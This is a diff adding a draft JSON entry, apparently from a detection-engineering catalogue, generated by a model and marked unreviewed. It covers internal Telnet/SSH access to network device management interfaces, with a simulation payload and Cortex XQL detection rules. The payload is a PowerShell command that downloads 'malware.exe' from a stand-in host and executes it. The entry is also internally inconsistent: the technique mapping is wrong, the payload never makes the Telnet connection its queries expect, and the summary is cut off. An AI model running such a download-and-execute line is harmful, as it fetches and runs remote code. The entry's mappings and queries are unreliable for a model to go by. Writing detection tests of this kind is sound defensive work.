@@ -1,0 +1,196 @@
+{
+  "id": "TTP-0000-0297",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Unusual Internal Access to Network Device Management Interface",
+    "summary": "An attacker uses a Windows endpoint to access a network device's management interface via Telnet or SSH, potentially leveraging stolen credentials or brute force. Cortex should detect the unusual proc",
+    "description": "An attacker uses a Windows endpoint to access a network device's management interface via Telnet or SSH, potentially leveraging stolen credentials or brute force. Cortex should detect the unusual process execution and network connection patterns associated with this behavior."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1021",
+        "subtechnique_id": "T1021.001",
+        "name": "Remote Services",
+        "tactic_ids": [
+          "TA0008"
+        ],
+        "tactic_names": [
+          "Lateral Movement"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.003",
+        "name": "Command and Scripting Interpreter: Windows Command Shell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1110",
+        "subtechnique_id": "T1110.001",
+        "name": "Brute Force: Password Guessing",
+        "tactic_ids": [
+          "TA0006"
+        ],
+        "tactic_names": [
+          "Credential Access"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://192.0.2.10/malware.exe' -OutFile 'C:\\\\temp\\\\malware.exe'\"\n& 'C:\\\\temp\\\\malware.exe'\nnetstat -an | findstr 23\nping 192.0.2.50\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "PowerShell process downloading malware",
+        "expected_value": "action_process_image_name = 'powershell.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Connection to C2 server",
+        "expected_value": "action_remote_ip = '192.0.2.10'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Connection to target device management interface",
+        "expected_value": "dst_ip = '192.0.2.50' and dst_port = 23"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Unusual Internal Access to Management Interface",
+        "description": "Detection of a process accessing a network device management interface from an internal host",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'powershell.exe'\n| filter action_remote_ip = '192.0.2.50'\n| filter dst_port = 23",
+        "mitre_technique_ids": [
+          "T1021.001",
+          "T1059.003",
+          "T1110.001"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Unusual PowerShell Network Access",
+        "description": "Behavioral deviation of PowerShell accessing network device management interfaces",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'powershell.exe'\n| filter action_remote_ip = '192.0.2.50'\n| filter dst_port = 23",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "action_process_image_name = 'powershell.exe'",
+        "mitre_technique_ids": [
+          "T1021.001",
+          "T1059.003",
+          "T1110.001"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Detect PowerShell Accessing Management Interfaces",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'powershell.exe'\n| filter action_remote_ip = '192.0.2.50'\n| filter dst_port = 23",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Unusual internal access to network device management interface; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/unusual-internal-access-to-network-device-management-interface"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Unusual internal access to network device management interface",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/unusual-internal-access-to-network-device-management-interface",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1021.001",
+      "url": "https://attack.mitre.org/techniques/T1021/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1059.003",
+      "url": "https://attack.mitre.org/techniques/T1059/003/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1110.001",
+      "url": "https://attack.mitre.org/techniques/T1110/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
